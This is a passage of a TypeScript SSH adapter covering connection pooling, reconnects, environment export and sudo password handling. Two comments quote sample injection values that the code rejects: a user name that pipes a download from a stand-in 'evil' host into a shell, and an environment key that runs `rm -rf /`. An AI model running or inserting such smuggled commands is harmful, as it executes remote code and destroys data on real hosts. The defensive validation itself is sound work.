
import { Readable } from 'node:stream';
import { connect as netConnect } from 'node:net';
import { createHash, randomBytes } from 'node:crypto';

import { KeyedMutex } from '../../utils/mutex.js';
import { StreamHandler } from '../../utils/stream.js';
import { ExecutionResult } from '../../core/result.js';
import { unrefTimer } from '../../utils/unref-timer.js';
import { SSHKeyValidator } from './ssh-key-validator.js';
import { SecurePasswordHandler } from './secure-password.js';
import { classifyFailure } from '../../core/failure-kind.js';
import { Command, SSHAdapterOptions } from '../../types/command.js';
import { BaseAdapter, BaseAdapterConfig } from '../base-adapter.js';
import { NodeSSH, Config as SSH2Config, SSHExecCommandResponse } from './ssh.js';
import { AdapterError, TimeoutError, ConnectionError } from '../../core/error.js';
import { quoteForShell, validateEnvName as validateEnvNameShared } from '../../utils/shell-escape.js';
import { PooledConnectionMetrics, ConnectionPoolMetricsCollector } from './connection-pool-metrics.js';

export interface SSHConnectionPoolOptions {
  enabled: boolean;
  maxConnections: number;
  idleTimeout: number;
  maxLifetime?: number;  // Maximum lifetime for a connection in milliseconds
  keepAlive: boolean;
  keepAliveInterval?: number;
  autoReconnect?: boolean;
  maxReconnectAttempts?: number;
  reconnectDelay?: number;
}

export interface SSHMultiplexingOptions {
  enabled: boolean;
  controlPath?: string;
  controlPersist?: string | number;
}

export interface SSHSudoOptions {
  enabled: boolean;
  password?: string;
  prompt?: string;
  method?: 'stdin' | 'askpass' | 'echo' | 'secure-askpass'; // Method to provide password
  secureHandler?: SecurePasswordHandler; // Optional custom handler, will create one if not provided
}

export interface SSHSFTPOptions {
  enabled: boolean;
  concurrency: number;
}

/**
 * Sudo settings after merging adapter-level {@link SSHSudoOptions} with the
 * per-command `sudo` block.
 *
 * The two sources historically named the same concept differently (`method`
 * vs `passwordMethod`); both are accepted here and reconciled at the single
 * point of use rather than being smuggled through an `any`.
 */
interface SudoConfig {
  enabled?: boolean;
  password?: string;
  user?: string;
  prompt?: string;
  method?: 'stdin' | 'askpass' | 'echo' | 'secure-askpass' | 'secure';
  passwordMethod?: 'stdin' | 'askpass' | 'echo' | 'secure';
  secureHandler?: SecurePasswordHandler;
}

/**
 * Validate a sudo target user name before it reaches a remote command line.
 *
 * The name is restricted to the POSIX portable user-name set rather than
 * merely quoted: a value such as `root; curl evil | sh` is a configuration
 * error and must be rejected outright, not silently executed as a quoted
 * argument that fails in a confusing way.
 *
 * @param user - The configured sudo user name.
 * @returns The same name once validated.
 * @throws {AdapterError} If the name contains anything outside `[A-Za-z0-9._-]`.
 */
/**
 * Validate an environment variable name before it is emitted into a remote
 * `export` statement.
 *
 * Only the value was previously escaped; the name was interpolated raw, so a
 * key such as `X=1; rm -rf /; A` injected arbitrary commands.
 *
 * @param name - The environment variable name.
 * @returns The same name once validated.
 * @throws {AdapterError} If the name is not a valid POSIX identifier.
 */
function validateEnvName(name: string): string {
  try {
    return validateEnvNameShared(name);
  } catch (error) {
    throw new AdapterError('ssh', 'env', error instanceof Error ? error : new Error(String(error)));
  }
}

function validateSudoUser(user: string): string {
  if (user.length === 0 || user.length > 32 || !/^[a-zA-Z0-9._][a-zA-Z0-9._-]*$/.test(user)) {
    throw new AdapterError(
      'ssh',
      'sudo',
      new Error(`Invalid sudo user name: ${JSON.stringify(user)}`)
    );
  }

  return user;
}

export interface SSHAdapterConfig extends BaseAdapterConfig {
  connectionPool?: SSHConnectionPoolOptions;
  defaultConnectOptions?: SSH2Config;
  multiplexing?: SSHMultiplexingOptions;
  sudo?: SSHSudoOptions;
  sftp?: SSHSFTPOptions;
  /**
   * Default host key checking policy for every connection this adapter opens.
   * Individual commands may override it. Defaults to `accept-new`.
   */
  hostKeyChecking?: 'accept-new' | 'strict' | 'off';
  /** Default `known_hosts` file for verification. */
  knownHostsPath?: string;
}

interface PooledConnection {
  ssh: NodeSSH;
  host: string;
  lastUsed: number;
  useCount: number;
  activeUseCount: number; // Reference count: >0 means connection is in use, prevents eviction
  created: number;
  errors: number;
  keepAliveTimer?: NodeJS.Timeout;
  reconnectAttempts: number;
  config: SSHAdapterOptions;
}

// defaultCwd stays optional: an ambient local-path default is meaningless on
// a remote host, and the base adapter deliberately no longer invents one.
type RequiredSSHConfig = Omit<Required<SSHAdapterConfig>, 'defaultCwd'> & { defaultCwd?: string };

export class SSHAdapter extends BaseAdapter {
  protected readonly adapterName = 'ssh';
  private sshConfig: RequiredSSHConfig;
  private connectionPool: Map<string, PooledConnection> = new Map();
  private poolCleanupInterval?: NodeJS.Timeout;
  private securePasswordHandler?: SecurePasswordHandler;
  private metricsCollector: ConnectionPoolMetricsCollector = new ConnectionPoolMetricsCollector();
  private activeTunnels: Map<string, { close: () => Promise<void> }> = new Map();
  private lastUsedSSHOptions?: SSHAdapterOptions;
  private connectionMutex = new KeyedMutex<string>();

  constructor(config: SSHAdapterConfig = {}) {
    super(config);
    this.name = this.adapterName;
    this.sshConfig = {
      ...this.config,
      connectionPool: {
        enabled: config.connectionPool?.enabled ?? true,
        maxConnections: config.connectionPool?.maxConnections ?? 10,
        idleTimeout: config.connectionPool?.idleTimeout ?? 300000, // 5 minutes
        keepAlive: config.connectionPool?.keepAlive ?? true,
        keepAliveInterval: config.connectionPool?.keepAliveInterval ?? 30000, // 30 seconds
        autoReconnect: config.connectionPool?.autoReconnect ?? true,
        maxReconnectAttempts: config.connectionPool?.maxReconnectAttempts ?? 3,
        reconnectDelay: config.connectionPool?.reconnectDelay ?? 1000 // 1 second
      },
      defaultConnectOptions: config.defaultConnectOptions ?? {},
      multiplexing: {
        enabled: config.multiplexing?.enabled ?? false,
        controlPath: config.multiplexing?.controlPath,
        controlPersist: config.multiplexing?.controlPersist ?? 600
      },
      sudo: {
        enabled: config.sudo?.enabled ?? false,
        password: config.sudo?.password,
        prompt: config.sudo?.prompt ?? '[sudo] password',
        method: config.sudo?.method ?? 'stdin',
        secureHandler: config.sudo?.secureHandler
      },
      sftp: {
        enabled: config.sftp?.enabled ?? true,
        concurrency: config.sftp?.concurrency ?? 5
      },
      hostKeyChecking: config.hostKeyChecking ?? 'accept-new',
      knownHostsPath: config.knownHostsPath as string
    };

    if (this.sshConfig.connectionPool.enabled) {
      this.startPoolCleanup();
    }
  }

  async isAvailable(): Promise<boolean> {
    // SSH is available if we can import the ssh2 module
    try {
      await import('ssh2');
      return true;
    } catch {
      return false;
    }
  }

  /**
   * Execute a command, recovering once from a transport that died in flight.
   *
   * A pooled connection is validated when it is handed out, but it can still
   * go away mid-command — the server restarts sshd, a NAT table drops the
   * flow, the network blips. Previously that surfaced as a plain failure and
   * every caller had to detect it and retry, which one production consumer
   * did by regex-matching error text. Doing it here means the pool owns its
   * own liveness.
   *
   * Only transport failures are retried, and only once: re-running a command
   * that already reached the server risks executing it twice.
   */
  async execute(command: Command): Promise<ExecutionResult> {
    try {
      return await this.executeOnce(command);
    } catch (error) {
      const sshOptions = this.extractSSHOptions(this.mergeCommand(command));

      if (!sshOptions || !this.shouldRetryOnFreshConnection(error)) {
        throw error;
      }

      // Drop the dead connection so the retry cannot be handed the same one.
      this.removeFromPool(this.getConnectionKey(sshOptions));

      this.emitAdapterEvent('ssh:reconnect', {
        host: sshOptions.host,
        attempts: 1
      });

      return this.executeOnce(command);
    }
  }

  /**
   * Decide whether a failure is worth one retry on a fresh connection.
   *
   * Deliberately narrow: a command that failed on its own merits, a rejected
   * credential or a mismatched host key must not be retried.
   */
  private shouldRetryOnFreshConnection(error: unknown): boolean {
    if (error instanceof TimeoutError) {
      // The command may still be running remotely; re-issuing it could run it
      // a second time.
      return false;
    }

    const cause = error instanceof ConnectionError ? error.originalError : error;
    return classifyFailure(cause) === 'connection-lost';
  }

  private async executeOnce(command: Command): Promise<ExecutionResult> {
    const mergedCommand = this.mergeCommand(command);
    const sshOptions = this.extractSSHOptions(mergedCommand);

    if (!sshOptions) {
      throw new AdapterError(this.adapterName, 'execute', new Error('SSH connection options not provided'));
    }

    // Track last used SSH options for tunnel creation
    this.lastUsedSSHOptions = sshOptions;

    const startTime = Date.now();
    let connection: PooledConnection | null = null;
    const commandString = this.buildCommandString(mergedCommand);

    try {
      connection = await this.getConnection(sshOptions);
      connection.activeUseCount++;

      // Emit execute event
      this.emitAdapterEvent('ssh:execute', {
        host: sshOptions.host,
        command: commandString
      });

      // Handle environment variables by prefixing the command
      let envPrefix = '';
      if (mergedCommand.env && Object.keys(mergedCommand.env).length > 0) {
        // Filter out only the explicitly set env vars (not from process.env)
        const explicitEnv: Record<string, string> = {};
        for (const [key, value] of Object.entries(mergedCommand.env)) {
          // Only include env vars that were explicitly set in the command
          if (command.env && key in command.env) {
            explicitEnv[key] = value;
          }
        }

        if (Object.keys(explicitEnv).length > 0) {
          const envVars = Object.entries(explicitEnv)
            .map(([key, value]) => `export ${validateEnvName(key)}=${quoteForShell(value, 'posix')}`)
            .join('; ');
          envPrefix = `${envVars}; `;
        }
      }

      // Handle sudo if enabled.
      //
      // The env prefix must stay OUTSIDE the sudo wrapper: `sudo -S export
      // FOO=bar; cmd` asks sudo to run the shell builtin `export` as a binary,
      // which fails, after which `cmd` runs without sudo at all. Wrapping only
      // the command keeps both halves working.
      const sudoCommand = await this.wrapWithSudo(commandString, mergedCommand, connection.ssh);
      const finalCommand = envPrefix + sudoCommand;

      // For SSH, only pass cwd if it was explicitly set in the original command
      // mergeCommand only carries a cwd that was explicitly asked for — the
      // per-adapter workaround that stripped an ambient local default out
      // again is gone along with the ambient default itself, so a configured
      // defaultCwd now reaches the remote side instead of being discarded.
      const sshCommand = { ...mergedCommand };

      // Execute command
      const connectionKey = this.getConnectionKey(sshOptions);
      const result = await this.executeSSHCommand(
        connection.ssh,
        finalCommand,
        sshCommand,
        connection.host,
        connectionKey
      );

      const endTime = Date.now();

      return this.createResult(
        result.stdout,
        result.stderr,
        result.code ?? 0,
        undefined,
        commandString,
        startTime,
        endTime,
        { host: `${sshOptions.host}:${sshOptions.port || 22}`, originalCommand: mergedCommand }
      );
    } catch (error) {
      if (error instanceof TimeoutError) {
        // Remove connection from pool after timeout
        if (connection) {
          this.removeFromPool(this.getConnectionKey(sshOptions));
        }
        // Handle timeout with nothrow
        if (mergedCommand.nothrow) {
          // Return error result for timeout without throwing
          const endTime = Date.now();
          return this.createResultNoThrow(
            '',
            error.message,
            124, // Standard timeout exit code
            'SIGTERM',
            commandString,
            startTime,
            endTime,
            { host: `${sshOptions.host}:${sshOptions.port || 22}`, originalCommand: mergedCommand }
          );
        }
        // Re-throw TimeoutError for consistent behavior
        throw error;
      }

      if (error instanceof ConnectionError) {
        throw error;
      }

      if (connection) {
        // Track error
        connection.errors++;

        // Remove failed connection from pool if too many errors
        if (connection.errors > 3) {
          this.removeFromPool(this.getConnectionKey(sshOptions));
        }
      }

      throw new AdapterError(
        this.adapterName,
        'execute',
        error instanceof Error ? error : new Error(String(error))
      );
    } finally {
      if (connection) {
        connection.activeUseCount = Math.max(0, connection.activeUseCount - 1);
        if (this.sshConfig.connectionPool.enabled) {
          connection.lastUsed = Date.now();
        }
      }
    }
  }

  private extractSSHOptions(command: Command): SSHAdapterOptions | null {
    if (command.adapterOptions?.type === 'ssh') {
      return command.adapterOptions;
    }
    return null;
  }

  private async getConnection(options: SSHAdapterOptions): Promise<PooledConnection> {
    const key = this.getConnectionKey(options);

    // Use mutex to prevent race conditions when accessing the connection pool
    return this.connectionMutex.withLock(key, async () => {
      // Try to get existing connection from pool
      if (this.sshConfig.connectionPool.enabled) {
        const existingConnection = await this.getExistingConnection(key, options);
        if (existingConnection) {
          return existingConnection;
        }
      }

      // No valid existing connection, create a new one
      return this.createNewConnection(options, key);
    });
  }

  private async getExistingConnection(key: string, options: SSHAdapterOptions): Promise<PooledConnection | null> {
    const existing = this.connectionPool.get(key);
    if (!existing) {
      return null;
    }

    const now = Date.now();
    const maxLifetime = this.sshConfig.connectionPool.maxLifetime ?? 3600000; // Default 1 hour

    // Check if connection exceeded maximum lifetime
    if (maxLifetime > 0 && (now - existing.created) > maxLifetime) {
      await this.closeConnection(key, existing, 'max_lifetime_exceeded');
      return null;
    }

    // Check if connection is still alive
    if (existing.ssh.isConnected()) {
      existing.useCount++;
      existing.lastUsed = now;
      this.metricsCollector.onConnectionReused();
      this.emitAdapterEvent('ssh:pool-metrics', {
        metrics: this.getPoolMetrics()
      });
      return existing;
    }

    // Try to reconnect if enabled
    if (this.sshConfig.connectionPool.autoReconnect) {
      try {
        const reconnected = await this.reconnectConnection(existing);
        if (reconnected) {
          return reconnected;
        }
      } catch {
        // Reconnection failed
      }
    }

    // Remove dead connection
    this.removeFromPool(key);
    return null;
  }

  private async createNewConnection(options: SSHAdapterOptions, key: string): Promise<PooledConnection> {
    // Validate options
    await this.validateConnectionOptions(options);

    // Create SSH connection
    const ssh = new NodeSSH();
    const connectOptions: SSH2Config = {
      ...this.sshConfig.defaultConnectOptions,
      host: options.host,
      username: options.username,
      port: options.port ?? 22,
      privateKey: options.privateKey as any,
      passphrase: options.passphrase,
      password: options.password,
      hostKeyChecking: options.hostKeyChecking ?? this.sshConfig.hostKeyChecking,
      knownHostsPath: options.knownHostsPath ?? this.sshConfig.knownHostsPath
    };

    try {
      await ssh.connect(connectOptions);
      this.emitConnectionEvents(options);
    } catch (error) {
      throw new ConnectionError(options.host, error instanceof Error ? error : new Error(String(error)));
    }

    const now = Date.now();
    const connection: PooledConnection = {
      ssh,
      host: options.host,
      lastUsed: now,
      useCount: 1,
      activeUseCount: 0,
      created: now,
      errors: 0,
      reconnectAttempts: 0,
      config: options
    };

    // Add to pool if enabled
    if (this.sshConfig.connectionPool.enabled) {
      this.addConnectionToPool(key, connection);
    }

    return connection;
  }

  private async validateConnectionOptions(options: SSHAdapterOptions): Promise<void> {
    // Validate SSH options
    const validationResult = SSHKeyValidator.validateSSHOptions({
      host: options.host,
      username: options.username,
      port: options.port,
      privateKey: options.privateKey,
      password: options.password
    });

    if (!validationResult.isValid) {
      throw new ConnectionError(
        options.host,
        new Error(`Invalid SSH options: ${validationResult.issues.join(', ')}`)
      );
    }

    // Validate private key if provided
    if (options.privateKey) {
      const keyValidation = await SSHKeyValidator.validatePrivateKey(options.privateKey);
      if (!keyValidation.isValid) {
        throw new ConnectionError(
          options.host,
          new Error(`Invalid SSH private key: ${keyValidation.issues.join(', ')}`)
        );
      }

      this.emitAdapterEvent('ssh:key-validated', {
        host: options.host,
        keyType: keyValidation.keyType || 'unknown',
        username: options.username || process.env['USER'] || 'unknown'
      });
    }
  }

  private emitConnectionEvents(options: SSHAdapterOptions): void {
    this.emitAdapterEvent('ssh:connect', {
      host: options.host,
      port: options.port ?? 22,
      username: options.username || process.env['USER'] || 'unknown'
    });

    this.emitAdapterEvent('connection:open', {
      host: options.host,
      port: options.port ?? 22,
      type: 'ssh',
      metadata: {
        username: options.username || process.env['USER'] || 'unknown'
      }
    });
  }

  private addConnectionToPool(key: string, connection: PooledConnection): void {
    // Check pool size limit
    if (this.connectionPool.size >= this.sshConfig.connectionPool.maxConnections) {
      this.removeOldestIdleConnection();
    }

    this.connectionPool.set(key, connection);
    this.metricsCollector.onConnectionCreated();

    // Set up keep-alive if enabled
    if (this.sshConfig.connectionPool.keepAlive) {
      this.setupKeepAlive(connection);
    }

    this.emitAdapterEvent('ssh:pool-metrics', {
      metrics: this.getPoolMetrics()
    });
  }

  private getConnectionKey(options: SSHAdapterOptions): string {
    // Credentials are part of a pooled connection's identity. Keying only on
    // user@host:port let two callers with *different* credentials share one
    // socket, so the second caller's credentials were never verified — an
    // authentication bypass in multi-tenant and credential-rotation setups.
    //
    // The material is hashed rather than embedded so that secrets never reach
    // pool keys, log lines or metrics labels.
    const credentialFingerprint = createHash('sha256')
      .update(typeof options.privateKey === 'string' ? options.privateKey : (options.privateKey ?? ''))
      .update('\0')
      .update(options.passphrase ?? '')
      .update('\0')
      .update(options.password ?? '')
      .digest('hex')
      .slice(0, 16);

    return `${options.username}@${options.host}:${options.port ?? 22}#${credentialFingerprint}`;
  }

  private async executeSSHCommand(
    ssh: NodeSSH,
    command: string,
    options: Partial<Command> = {},
    host?: string,
    connectionKey?: string
  ): Promise<SSHExecCommandResponse> {
    // The remote process is terminated through the exec channel — on abort,
    // and when output blows the cap, where letting it keep streaming into a
    // void serves nobody. The channel arrives via onChannel below.
    let channel: { signal(name: string): void; close(): void } | null = null;
    let terminated = false;
    const terminate = (): void => {
      if (terminated || !channel) return;
      terminated = true;
      try {
        channel.signal('TERM');
      } catch {
        // The channel may already be closing; closing below still applies.
      }
      try {
        channel.close();
      } catch {
        // Already closed.
      }
    };

    const stdoutHandler = new StreamHandler({
      encoding: this.config.encoding,
      maxBuffer: options.maxBuffer ?? this.config.maxBuffer,
      streamName: 'stdout',
      onOverflow: () => terminate()
    });

    const stderrHandler = new StreamHandler({
      encoding: this.config.encoding,
      maxBuffer: options.maxBuffer ?? this.config.maxBuffer,
      streamName: 'stderr',
      onOverflow: () => terminate()
    });

    const clearAbort = this.setupAbortSignal(options.signal, terminate);

    // Create exec options
    const execOptions: any = {
      cwd: options.cwd,
      stdin: this.convertStdin(options.stdin),
      execOptions: {},
      onChannel: (ch: { signal(name: string): void; close(): void }) => {
        channel = ch;

        // The exec channel is the reachable end of the remote process. No
        // pid: the remote id is not knowable from here, and reporting a
        // local one would invite signalling the wrong machine.
        const duplex = ch as unknown as {
          write?: unknown;
          stderr?: NodeJS.ReadableStream;
        };
        options.onSpawn?.({
          stdin: (typeof duplex.write === 'function' ? ch : null) as never,
          stdout: (typeof duplex.write === 'function' ? ch : null) as never,
          stderr: (duplex.stderr ?? null) as never,
          kill: () => terminate(),
        });
      }
    };

    // Set up stream handling if we're piping
    if (options.stdout === 'pipe') {
      execOptions.onStdout = (chunk: Buffer) => {
        const transform = stdoutHandler.createTransform();
        transform.write(chunk);
        transform.end();
      };
    }

    if (options.stderr === 'pipe') {
      execOptions.onStderr = (chunk: Buffer) => {
        const transform = stderrHandler.createTransform();
        transform.write(chunk);
        transform.end();
      };
    }

    // Execute the command
    const execPromise = ssh.execCommand(command, execOptions)
      .catch(error => {
        // If the command fails after we've already timed out,
        // we don't want an unhandled rejection
        if (error.message?.includes('Socket closed') ||
          error.message?.includes('Connection closed') ||
          error.message?.includes('Not connected')) {
          // Connection was closed due to timeout, this is expected
          return { code: -1, stdout: '', stderr: 'Connection closed due to timeout' };
        }
        throw error;
      });

    // Handle timeout
    const timeout = options.timeout ?? this.config.defaultTimeout;
    let result;
    try {
      result = await this.handleTimeout(
        execPromise,
        timeout,
        command,
        // A timed-out remote process is terminated through its exec channel,
        // the same route as an abort.
        terminate
      );
    } finally {
      // Always detach the abort listener — leaving it attached after a
      // timeout or exec error would accumulate one listener per command on a
      // long-lived AbortSignal.
      clearAbort();
    }

    // Truncated output must never read as a clean success.
    const overflow = stdoutHandler.overflowError ?? stderrHandler.overflowError;
    if (overflow) {
      overflow.partialStdout = stdoutHandler.getContent();
      overflow.partialStderr = stderrHandler.getContent();
      throw overflow;
    }

    // Override stdout/stderr with our collected data if we were piping
    if (options.stdout === 'pipe') {
      result.stdout = stdoutHandler.getContent();
    }
    if (options.stderr === 'pipe') {
      result.stderr = stderrHandler.getContent();
    }

    return result;
  }

  private convertStdin(stdin: Command['stdin']): string | Readable | undefined {
    if (!stdin) return undefined;
    if (typeof stdin === 'string') return stdin;
    if (Buffer.isBuffer(stdin)) return stdin.toString();

    if (stdin instanceof Readable) {
      // The exec layer pipes a readable straight into the channel. This used
      // to return undefined, so `$.ssh(...)\`cmd\`` with a stream stdin
      // silently ran the command with no input at all.
      return stdin;
    }

    return undefined;
  }

  private async wrapWithSudo(command: string, options: Command, ssh: NodeSSH): Promise<string> {
    // First check if sudo is enabled globally in adapter config
    const globalSudoEnabled = this.sshConfig.sudo.enabled;

    // Then check if it's overridden in command options
    const sshOptions = this.extractSSHOptions(options);
    const commandSudoEnabled = sshOptions?.sudo?.enabled;

    // If sudo is not enabled at all, return the command as-is
    if (!globalSudoEnabled && !commandSudoEnabled) {
      return command;
    }

    // Merge sudo config: command options override global config
    const sudoConfig = {
      ...this.sshConfig.sudo,
      ...(sshOptions?.sudo || {})
    };

    // Initialize secure password handler if needed and not already done
    const method = sudoConfig.method || sudoConfig.passwordMethod;
    if ((method === 'secure' || method === 'secure-askpass') && !this.securePasswordHandler) {
      this.securePasswordHandler = sudoConfig.secureHandler || new SecurePasswordHandler();
    }

    return this.buildSudoCommandWithConfig(command, sudoConfig);
  }

  private buildSudoCommandWithConfig(rawCommand: string, sudoConfig: SudoConfig): string {
    if (!sudoConfig || !sudoConfig.enabled) return rawCommand;

    const sudoCmd = sudoConfig.user
      ? `sudo -u ${quoteForShell(validateSudoUser(sudoConfig.user), 'posix')}`
      : 'sudo';

    // Run the whole command inside a privileged shell rather than handing its
    // words to sudo directly. Without this, the *calling* shell expands
    // `$(…)`, applies redirections and splits pipelines before sudo starts, so
    // `echo $(whoami)` reported the unprivileged user and `cmd > /root/f`
    // failed on permissions — surprising for something the user asked to run
    // as root.
    const command = `sh -c ${quoteForShell(rawCommand, 'posix')}`;

    // Handle password authentication
    if (sudoConfig.password) {
      const method = sudoConfig.method || sudoConfig.passwordMethod || 'stdin';

      switch (method) {
        case 'stdin':
          // Use printf instead of echo for better security and compatibility
          // The password is still visible in process list, but for a shorter time
          console.warn('Using stdin method for sudo password may expose it in process listings. Consider using secure-askpass method.');
          return `printf '%s\n' ${quoteForShell(sudoConfig.password, 'posix')} | ${sudoCmd} -S ${command}`;

        case 'echo':
          console.warn('Using echo for sudo password is insecure and may expose the password in process listings. Consider using secure-askpass method.');
          // Use printf for better compatibility and slightly better security
          return `printf '%s\n' ${quoteForShell(sudoConfig.password, 'posix')} | ${sudoCmd} -S ${command}`;

        case 'askpass':
          // Falls through to the secure construction below. The old branch
          // emitted `SUDO_ASKPASS=/tmp/askpass_$$` and never created that
          // file, so the method could not deliver a password at all — and
          // the PID-predictable path invited a local user on the remote to
          // plant one. There is exactly one correct askpass construction;
          // every spelling of the option gets it.
        case 'secure':
        case 'secure-askpass': {
          // Build an askpass script on the remote host so the password never
          // appears in the remote process list.
          //
          // The lines below MUST be joined with newlines: a heredoc is
          // line-oriented, and joining with ` && ` previously collapsed the
          // whole script onto one line where `#!/bin/sh` started a comment
          // that swallowed the command. The result was a no-op that exited 0,
          // so sudo commands silently appeared to succeed.
          const scriptId = randomBytes(12).toString('hex');
          const remoteAskpassPath = `/tmp/.xec-askpass-${scriptId}`;
          const quotedPath = quoteForShell(remoteAskpassPath, 'posix');

          // A random terminator cannot collide with password content.
          const heredocTag = `XEC_ASKPASS_${randomBytes(8).toString('hex').toUpperCase()}`;
          const quotedPassword = quoteForShell(sudoConfig.password, 'posix');

          return [
            // umask before creation closes the world-readable window that a
            // create-then-chmod sequence leaves open.
            'umask 077',
            `cat > ${quotedPath} << '${heredocTag}'`,
            '#!/bin/sh',
            `printf '%s\\n' ${quotedPassword}`,
            heredocTag,
            `chmod 700 ${quotedPath}`,
            `SUDO_ASKPASS=${quotedPath} ${sudoCmd} -A ${command}`,
            // Preserve the command's exit status across cleanup, and clean up
            // even when the command fails.
            '__xec_sudo_status=$?',
            `rm -f ${quotedPath}`,
            'exit $__xec_sudo_status'
          ].join('\n');
        }

        default:
          return `${sudoCmd} ${command}`;
      }
    }

    // No password required
    return `${sudoCmd} ${command}`;
  }

  private startPoolCleanup(): void {
    this.poolCleanupInterval = setInterval(async () => {
      const now = Date.now();
      const idleTimeout = this.sshConfig.connectionPool.idleTimeout;
      const maxLifetime = this.sshConfig.connectionPool.maxLifetime ?? 3600000; // Default 1 hour
      const connectionsToClose: Array<[string, PooledConnection, string]> = [];

      // Identify connections to close (skip connections currently in use)
      for (const [key, connection] of this.connectionPool.entries()) {
        // Never evict connections with active operations
        if (connection.activeUseCount > 0) {
          continue;
        }

        // Check idle timeout
        if (now - connection.lastUsed > idleTimeout) {
          connectionsToClose.push([key, connection, 'idle_timeout']);
          continue;
        }

        // Check max lifetime
        if (maxLifetime > 0 && (now - connection.created) > maxLifetime) {
          connectionsToClose.push([key, connection, 'max_lifetime_exceeded']);
          continue;
        }

        // Check connection health
        if (!connection.ssh.isConnected()) {
          connectionsToClose.push([key, connection, 'connection_dead']);
        }
      }

      // Close connections
      if (connectionsToClose.length > 0) {
        await Promise.all(
          connectionsToClose.map(([key, connection, reason]) =>
            this.closeConnection(key, connection, reason)
          )
        );

        this.metricsCollector.onCleanup();

        // Emit cleanup event
        this.emitAdapterEvent('ssh:pool-cleanup', {
          cleaned: connectionsToClose.length,
          remaining: this.connectionPool.size
        });
      }
    }, 60000); // Check every minute

    // Unref the interval so it doesn't keep the process alive
    unrefTimer(this.poolCleanupInterval);
  }

  private removeFromPool(key: string): void {
    const connection = this.connectionPool.get(key);
    if (connection) {
      // Use async closeConnection method but don't await (for backward compatibility)
      this.closeConnection(key, connection, 'pool_removal').catch(error => {
        console.error(`Error closing connection ${key}:`, error);
      });
    }
  }

  private async closeConnection(key: string, connection: PooledConnection, reason: string): Promise<void> {
    // Clear keep-alive timer first to prevent any further keep-alive attempts
    if (connection.keepAliveTimer) {
      clearInterval(connection.keepAliveTimer);
      connection.keepAliveTimer = undefined;
    }

    // Extract host info from connection key
    const [hostPort] = key.split('@').slice(-1);
    const [host = 'unknown', port = '22'] = (hostPort || 'unknown:22').split(':');

    // Emit SSH-specific disconnect event
    this.emitAdapterEvent('ssh:disconnect', {
      host,
      reason
    });

    // Emit generic connection close event
    this.emitAdapterEvent('connection:close', {
      host,
      port: parseInt(port, 10),
      type: 'ssh',
      reason
    });

    // Dispose the SSH connection
    try {
      await connection.ssh.dispose();
    } catch (error) {
      console.error(`Error disposing SSH connection ${key}:`, error);
    }

    // Remove from pool and update metrics
    this.connectionPool.delete(key);
    this.metricsCollector.onConnectionDestroyed();
  }

  private async reconnectConnection(connection: PooledConnection): Promise<PooledConnection | null> {
    const maxAttempts = this.sshConfig.connectionPool.maxReconnectAttempts ?? 3;
    const delay = this.sshConfig.connectionPool.reconnectDelay ?? 1000;

    if (connection.reconnectAttempts >= maxAttempts) {
      this.metricsCollector.onConnectionFailed();
      return null;
    }

    connection.reconnectAttempts++;

    try {
      // Wait before reconnecting
      await new Promise(resolve => setTimeout(resolve, delay * connection.reconnectAttempts));

      // Try to reconnect
      await connection.ssh.connect({
        host: connection.config.host,
        username: connection.config.username,
        port: connection.config.port ?? 22,
        privateKey: connection.config.privateKey as any,
        passphrase: connection.config.passphrase,
        password: connection.config.password
      });

      // Reset error count on successful reconnect
      connection.errors = 0;
      connection.lastUsed = Date.now();

      // Re-setup keep-alive
      if (this.sshConfig.connectionPool.keepAlive) {
        this.setupKeepAlive(connection);
      }

      this.emitAdapterEvent('ssh:reconnect', {
        host: connection.host,
        attempts: connection.reconnectAttempts
      });

      return connection;
    } catch (error) {
      connection.errors++;
      this.metricsCollector.onConnectionFailed();
      throw error;
    }
  }

  private setupKeepAlive(connection: PooledConnection): void {
    const interval = this.sshConfig.connectionPool.keepAliveInterval ?? 30000;

    // Clear existing timer if any
    if (connection.keepAliveTimer) {
      clearInterval(connection.keepAliveTimer);
      connection.keepAliveTimer = undefined;
    }

    // Create a bound reference to prevent memory leaks
    const keepAliveFunction = async () => {
      try {
        // Check if connection is still in pool before sending keep-alive
        if (!this.connectionPool.has(this.getConnectionKey(connection.config))) {
          if (connection.keepAliveTimer) {
            clearInterval(connection.keepAliveTimer);
            connection.keepAliveTimer = undefined;
          }
          return;
        }

        // Send a simple command to keep connection alive
        await connection.ssh.execCommand('echo "keep-alive"', {
          cwd: '/',
          execOptions: { pty: false }
        });
      } catch {
        // Connection might be dead, will be handled on next use
        connection.errors++;

        // If too many errors, remove from pool
        if (connection.errors > 3) {
          const key = this.getConnectionKey(connection.config);
          if (this.connectionPool.has(key)) {
            this.removeFromPool(key);
          }
        }
      }
    };

    connection.keepAliveTimer = setInterval(keepAliveFunction, interval);

    // Unref the timer so it doesn't keep the process alive
    unrefTimer(connection.keepAliveTimer);
  }

  private removeOldestIdleConnection(): void {
    let oldestKey: string | null = null;
    let oldestTime = Date.now();

    for (const [key, connection] of this.connectionPool.entries()) {
      if (connection.lastUsed < oldestTime) {
        oldestTime = connection.lastUsed;
        oldestKey = key;
      }
    }

    if (oldestKey) {
      this.removeFromPool(oldestKey);
    }
  }

  private getPoolMetrics() {
    const connections = new Map<string, PooledConnectionMetrics>();

    for (const [key, conn] of this.connectionPool.entries()) {
      connections.set(key, {
        created: new Date(conn.created),
        lastUsed: new Date(conn.lastUsed),
        useCount: conn.useCount,
        isAlive: conn.ssh.isConnected(),
        errors: conn.errors
      });
    }

    return this.metricsCollector.getMetrics(this.connectionPool.size, connections);
  }

  getConnectionPoolMetrics() {
    return this.getPoolMetrics();
  }

  async dispose(): Promise<void> {
    // Clear pool cleanup interval first
    if (this.poolCleanupInterval) {
      clearInterval(this.poolCleanupInterval);
      this.poolCleanupInterval = undefined;
    }

    // Close all tunnels
    const tunnelClosePromises: Promise<void>[] = [];
    for (const [id, tunnel] of this.activeTunnels) {
      tunnelClosePromises.push(
        tunnel.close().catch(error => {
          // Log error but continue closing other tunnels
          console.error(`Failed to close tunnel ${id}:`, error);
        })
      );
    }

    // Wait for all tunnels to close
    await Promise.all(tunnelClosePromises);
    this.activeTunnels.clear();

    // Close all connections in the pool
    const connectionClosePromises: Promise<void>[] = [];
    for (const [key, connection] of this.connectionPool.entries()) {
      connectionClosePromises.push(
        this.closeConnection(key, connection, 'adapter_dispose')
      );
    }

    // Wait for all connections to close
    await Promise.all(connectionClosePromises);
    this.connectionPool.clear();

    // Clean up secure password handler
    if (this.securePasswordHandler) {
      try {
        await this.securePasswordHandler.cleanup();
      } catch (error) {
        console.error('Failed to cleanup secure password handler:', error);
      }
      this.securePasswordHandler = undefined;
    }
